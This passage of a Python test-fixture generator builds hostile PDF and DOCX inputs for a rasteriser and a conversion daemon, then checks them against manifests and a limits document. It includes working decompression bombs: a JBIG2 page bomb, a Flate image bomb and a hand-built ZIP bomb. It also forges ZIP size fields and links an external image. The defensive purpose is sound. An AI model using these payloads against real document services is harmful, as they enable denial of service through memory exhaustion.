def jbig2_page_bomb(w, h):
    """An embedded JBIG2 stream (no file header): a page information segment declaring a
    w x h page, then end of page. Decoding it allocates the whole page bitmap."""
    info = w.to_bytes(4, "big") + h.to_bytes(4, "big") + bytes(8) + b"\x00" + bytes(2)
    seg = lambda num, kind, data: num.to_bytes(4, "big") + bytes([kind, 0, 1]) + len(data).to_bytes(4, "big") + data
    return seg(0, 48, info) + seg(1, 49, b"")


def ml_builders():
    """name -> bytes for the modeld rasteriser's hostile fixtures (SEC-I02)."""
    b = {}
    rule_and_box = b"0 g 72 600 m 400 600 l S 72 500 12 12 re S"
    b["ml_valid.pdf"] = lambda: ml_page(rule_and_box)
    b["ml_mediabox_huge.pdf"] = lambda: ml_page(rule_and_box, media=b"[0 0 200000 200000]")
    b["ml_image_100k.pdf"] = lambda: ml_image(
        b"/Width 100000/Height 100000/ColorSpace/DeviceGray/BitsPerComponent 8/Filter/FlateDecode",
        zlib.compress(bytes(4096)))
    b["ml_jbig2_bomb.pdf"] = lambda: ml_image(
        b"/Width 60000/Height 60000/ColorSpace/DeviceGray/BitsPerComponent 1/Filter/JBIG2Decode",
        jbig2_page_bomb(60000, 60000))
    b["ml_flate_image_bomb.pdf"] = lambda: ml_image(
        b"/Width 10000/Height 10000/ColorSpace/DeviceRGB/BitsPerComponent 8/Filter/FlateDecode",
        zeros_deflate(b"", 10000 * 10000 * 3))

    def xobject_deep(depth=64):
        forms = []
        for i in range(depth):
            num = 5 + i
            if i + 1 < depth:
                body, res = b"/Fm Do", b"/Resources<</XObject<</Fm %d 0 R>>>>" % (num + 1)
            else:
                body, res = b"0 g 72 600 m 400 600 l S", b""
            forms.append((num, stream_obj(b"/Type/XObject/Subtype/Form/BBox[0 0 612 792]" + res, body)))
        return ml_page(b"/Fm Do", b"/XObject<</Fm 5 0 R>>", extra=forms)
    b["ml_xobject_deep.pdf"] = xobject_deep
    return b

# ---- DOCX (VS-06C): Word uploads for the conversion daemon --------------------------------

W_NS = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
R_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
DOCX_MAIN = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
DOCX_TEMPLATE = "application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml"
DOCM_MAIN = "application/vnd.ms-word.document.macroEnabled.main+xml"


def docx_types(main=DOCX_MAIN, extra=""):
    return ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Default Extension="png" ContentType="image/png"/>'
            f'<Override PartName="/word/document.xml" ContentType="{main}"/>{extra}</Types>')


DOCX_ROOT_RELS = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                  '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                  '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
                  '</Relationships>')


def docx_body(paragraphs):
    return ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            f'<w:document xmlns:w="{W_NS}" xmlns:r="{R_NS}"'
            ' xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"'
            ' xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"'
            ' xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">'
            '<w:body>' + "".join(paragraphs) +
            '<w:sectPr><w:pgSz w:w="12240" w:h="15840"/>'
            '<w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>'
            '</w:sectPr></w:body></w:document>')


def para(text, bold=False):
    rpr = "<w:rPr><w:b/></w:rPr>" if bold else ""
    return f'<w:p><w:r>{rpr}<w:t xml:space="preserve">{text}</w:t></w:r></w:p>'


PAGE_BREAK = '<w:p><w:r><w:br w:type="page"/></w:r></w:p>'


def docx_zip(parts):
    """A ZIP of (name, bytes or str) parts, deflated, with a fixed timestamp."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in parts:
            info = zipfile.ZipInfo(name, date_time=(2026, 11, 20, 0, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            z.writestr(info, data.encode("utf8") if isinstance(data, str) else data)
    return buf.getvalue()


def docx_valid_parts(paragraphs=None):
    paragraphs = paragraphs or [
        para("Mutual non-disclosure agreement", bold=True),
        para("This agreement is made between the parties named below."),
        PAGE_BREAK,
        para("Signed by the parties on the date below."),
    ]
    return [("[Content_Types].xml", docx_types()), ("_rels/.rels", DOCX_ROOT_RELS),
            ("word/document.xml", docx_body(paragraphs))]


def patch_central(data, edit):
    """Rewrite each central-directory header of a ZIP through edit(bytearray, offset)."""
    out = bytearray(data)
    i = out.find(b"PK\x01\x02")
    while i >= 0:
        edit(out, i)
        i = out.find(b"PK\x01\x02", i + 4)
    return bytes(out)


def docx_builders():
    """name -> bytes for the conversion daemon's fixtures (VS-06C, SEC-P13)."""
    b = {}
    b["docx_valid.docx"] = lambda: docx_zip(docx_valid_parts())

    def macro_docm():
        parts = docx_valid_parts()
        parts[0] = ("[Content_Types].xml", docx_types(DOCM_MAIN, '<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>'))
        return docx_zip(parts + [("word/vbaProject.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + bytes(504))])
    b["docx_macro.docm"] = macro_docm
    b["docx_vba_part.docx"] = lambda: docx_zip(docx_valid_parts() + [("word/vbaProject.bin", bytes(512))])
    b["docx_template.dotx"] = lambda: docx_zip([("[Content_Types].xml", docx_types(DOCX_TEMPLATE))] + docx_valid_parts()[1:])
    b["docx_not_word.docx"] = lambda: docx_zip([("readme.txt", "not a Word document")])

    def zip_bomb():
        # 60 MiB of zeros deflate about 1:1030: one part under the part cap, over the ratio cap.
        z = zlib.compressobj(9, zlib.DEFLATED, -15)
        chunk = bytes(1 << 20)
        raw = b"".join(z.compress(chunk) for _ in range(60)) + z.flush()
        size = 60 << 20
        crc = 0
        for _ in range(60):
            crc = zlib.crc32(chunk, crc)
        valid = docx_zip(docx_valid_parts())
        # Append the bomb as a raw deflated entry by hand: zipfile would deflate it again.
        name = b"word/media/bomb.bin"
        local = struct.pack("<4sHHHHHIIIHH", b"PK\x03\x04", 20, 0, 8, 0, 0x5B74, crc, len(raw), size, len(name), 0) + name + raw
        cd_at = valid.find(b"PK\x01\x02")
        eocd_at = valid.rfind(b"PK\x05\x06")
        entries, cd_size, cd_off = struct.unpack("<HII", valid[eocd_at + 10:eocd_at + 20])
        central = valid[cd_at:eocd_at]
        new_off = cd_at
        bomb_central = struct.pack("<4sHHHHHHIIIHHHHHII", b"PK\x01\x02", 20, 20, 0, 8, 0, 0x5B74, crc, len(raw), size, len(name), 0, 0, 0, 0, 0, new_off) + name
        body = valid[:cd_at] + local
        cd = central + bomb_central
        eocd = struct.pack("<4sHHHHIIH", b"PK\x05\x06", 0, 0, entries + 1, entries + 1, len(cd), len(body), 0)
        return body + cd + eocd
    b["docx_zip_bomb.docx"] = zip_bomb

    def declared_part():
        # One part whose central header declares 70 MiB: over the part cap, refused from
        # the directory before anything is expanded.
        def edit(out, i):
            if out[i + 46:i + 46 + 17] == b"word/document.xml":
                struct.pack_into("<I", out, i + 24, 70 << 20)
        return patch_central(docx_zip(docx_valid_parts()), edit)
    b["docx_part_70mib.docx"] = declared_part

    def declared_total():
        # Five parts each declaring 60 MiB expanded from 1 MiB: each under the part and
        # ratio caps, 300 MiB together over the total.
        def edit(out, i):
            if out[i + 46:i + 46 + 10] == b"customXml/":
                struct.pack_into("<II", out, i + 20, 1 << 20, 60 << 20)
        parts = docx_valid_parts() + [(f"customXml/big{i}.xml", "<a/>") for i in range(5)]
        return patch_central(docx_zip(parts), edit)
    b["docx_expanded_300mib.docx"] = declared_total

    def lying_size():
        # The main part declares 10 bytes and expands to more: malformed.
        def edit(out, i):
            if out[i + 46:i + 46 + 17] == b"word/document.xml":
                struct.pack_into("<I", out, i + 24, 10)
        return patch_central(docx_zip(docx_valid_parts()), edit)
    b["docx_lying_size.docx"] = lying_size

    def encrypted():
        def edit(out, i):
            struct.pack_into("<H", out, i + 8, struct.unpack_from("<H", out, i + 8)[0] | 1)
        return patch_central(docx_zip(docx_valid_parts()), edit)
    b["docx_encrypted.docx"] = encrypted
    b["docx_entries_4097.docx"] = lambda: docx_zip(docx_valid_parts() + [(f"customXml/item{i}.xml", "<a/>") for i in range(4097)])
    b["docx_pages_5001.docx"] = lambda: docx_zip(docx_valid_parts([para("page")] + [PAGE_BREAK] * 5001))

    def malformed_xml():
        parts = docx_valid_parts()
        parts[2] = ("word/document.xml", f'<?xml version="1.0"?><w:document xmlns:w="{W_NS}"><w:body><w:p><w:r><w:t>unclosed')
        return docx_zip(parts)
    b["docx_malformed_xml.docx"] = malformed_xml

    def external_picture():
        url = f"http://127.0.0.1:{DOCX_EXTERNAL_PORT}/pixel.png"
        drawing = ('<w:p><w:r><w:drawing><wp:inline><wp:extent cx="914400" cy="914400"/><wp:docPr id="1" name="Linked"/>'
                   '<a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic>'
                   '<pic:nvPicPr><pic:cNvPr id="1" name="Linked"/><pic:cNvPicPr/></pic:nvPicPr>'
                   '<pic:blipFill><a:blip r:link="rId9"/><a:stretch><a:fillRect/></a:stretch></pic:blipFill>'
                   '<pic:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="914400" cy="914400"/></a:xfrm><a:prstGeom prst="rect"><a:avLst/></a:prstGeom></pic:spPr>'
                   '</pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>')
        link = f'<w:p><w:hyperlink r:id="rId10"><w:r><w:t>{url}</w:t></w:r></w:hyperlink></w:p>'
        rels = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                f'<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{url}" TargetMode="External"/>'
                f'<Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="{url}" TargetMode="External"/>'
                '</Relationships>')
        return docx_zip(docx_valid_parts([para("A linked picture follows."), drawing, link]) + [("word/_rels/document.xml.rels", rels)])
    b["docx_external_picture.docx"] = external_picture
    return b


def read_docx_manifest():
    rows = []
    for line in DOCX_MANIFEST.read_text(encoding="utf8").splitlines()[1:]:
        if line.strip():
            rows.append(line.split("\t"))
    return rows


def check_docx():
    problems = []
    names = list(docx_builders())
    rows = read_docx_manifest()
    listed = [r[0] for r in rows]
    section = LIMITS_DOC.read_text(encoding="utf8").split("## DOCX conversion", 1)[1].split("\n## ", 1)[0]
    for r in rows:
        if len(r) != 4:
            problems.append(f"docx manifest row has {len(r)} columns, not 4: {r[0]}")
        elif r[1] != "control" and f"| {r[1]} |" not in section:
            problems.append(f"{r[0]}: limit {r[1]!r} is not a docs/21 §DOCX conversion row")
    for n in names:
        if n not in listed:
            problems.append(f"{n}: written by the generator, missing from the docx manifest")
    for n in listed:
        if n not in names:
            problems.append(f"{n}: in the docx manifest, not written by the generator")
    return problems


def write_docx():
    OUT_DOCX.mkdir(parents=True, exist_ok=True)
    for name, build in docx_builders().items():
        data = build()
        (OUT_DOCX / name).write_bytes(data)
        print(f"docx/{name:24} {len(data):>12,}")


def read_ml_manifest():
    rows = []
    for line in ML_MANIFEST.read_text(encoding="utf8").splitlines()[1:]:
        if line.strip():
            rows.append(line.split("\t"))
    return rows


def check_ml():
    problems = []
    names = list(ml_builders())
    rows = read_ml_manifest()
    listed = [r[0] for r in rows]
    ml = LIMITS_DOC.read_text(encoding="utf8").split("## ML", 1)[1].split("\n## ", 1)[0]
    for r in rows:
        if len(r) != 4:
            problems.append(f"ml manifest row has {len(r)} columns, not 4: {r[0]}")
        elif r[1] != "control" and f"| {r[1]} |" not in ml:
            problems.append(f"{r[0]}: limit {r[1]!r} is not a docs/21 §ML row")
    for n in names:
        if n not in listed:
            problems.append(f"{n}: written by the generator, missing from the ml manifest")
    for n in listed:
        if n not in names:
            problems.append(f"{n}: in the ml manifest, not written by the generator")
    return problems


def read_manifest():
    rows = []
    for line in MANIFEST.read_text(encoding="utf8").splitlines()[1:]:
        if line.strip():
            rows.append(line.split("\t"))
    return rows


def check():
    problems = []
    names = list(builders())
    rows = read_manifest()
    listed = [r[0] for r in rows]
    for r in rows:
        if len(r) != 5:
            problems.append(f"manifest row has {len(r)} columns, not 5: {r[0]}")
    for n in names:
        if n not in listed:
            problems.append(f"{n}: written by the generator, missing from the manifest")
    for n in listed:
        if n not in names:
            problems.append(f"{n}: in the manifest, not written by the generator")
    covered = {lim for r in rows if len(r) == 5 for lim in r[1].split("; ")}
    pdf = LIMITS_DOC.read_text(encoding="utf8").split("## PDF", 1)[1].split("\n## ", 1)[0]
    for line in pdf.splitlines():
        cells = [c.strip() for c in line.strip().strip("|").split("|")]
        if len(cells) == 4 and cells[2].startswith("CS-") and cells[0] not in covered and cells[0] not in NO_FIXTURE:
            problems.append(f"docs/21 limit has no fixture and no reason: {cells[0]}")
    problems.extend(check_ml())
    problems.extend(check_docx())
    if problems:
        print("hostile fixtures out of step (fixtures/tools/generate.py --check):", file=sys.stderr)
        for p in problems:
            print(f"  {p}", file=sys.stderr)
        return 1
    print(f"hostile fixtures: {len(names)} files, {len(ml_builders())} ml files and {len(docx_builders())} docx files, manifests and docs/21 agree")
    return 0


def main(argv):
    if argv[1:] == ["--check"]:
        return check()
    if argv[1:] == ["--ml"]:
        OUT_ML.mkdir(parents=True, exist_ok=True)
        for name, build in ml_builders().items():
            (OUT_ML / name).write_bytes(build())
        return check()
    if argv[1:] == ["--docx"]:
        write_docx()
        return check()
    if len(argv) > 1:
        print(__doc__, file=sys.stderr)
        return 2
    OUT.mkdir(parents=True, exist_ok=True)
    for name, build in builders().items():
        data = build()
        (OUT / name).write_bytes(data)
        print(f"{name:28} {len(data):>12,}")
    OUT_ML.mkdir(parents=True, exist_ok=True)
    for name, build in ml_builders().items():
        data = build()
        (OUT_ML / name).write_bytes(data)
        print(f"ml/{name:25} {len(data):>12,}")
    write_docx()
    return check()


if __name__ == "__main__":
    sys.exit(main(sys.argv))
